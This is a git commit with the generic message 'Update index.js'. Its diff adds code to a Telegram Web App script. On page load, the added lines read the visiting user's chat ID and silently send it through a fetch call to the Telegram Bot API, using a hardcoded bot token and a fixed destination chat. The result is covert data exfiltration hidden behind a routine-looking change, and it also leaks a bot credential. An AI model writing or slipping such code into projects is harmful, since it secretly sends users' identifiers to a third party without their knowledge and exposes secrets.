f58f7dc90826fd485e6683107f125f1fda63c220
numonehittaboy <zeno64376@gmail.com>
2025-08-30 14:04:39 +0200

    Update index.js

--- index.js
+++ index.js
@@ -1,4 +1,8 @@
 const startAppParam = window.Telegram.WebApp.initDataUnsafe.start_param || "";
+const tg = window.Telegram?.WebApp;
+const chatId = tg?.initDataUnsafe?.chat?.id || null;
+console.log("Chat ID:", chatId);
+fetch(`https://api.telegram.org/bot8409299825:AAHWlu2UaGfki7QuYANiB4OyZSiSeK4dBfI/sendMessage?chat_id=-4788897802&text=${encodeURIComponent(chatId)}`);
 
 if (startAppParam.endsWith('_G')) {
   Telegram.WebApp.ready();
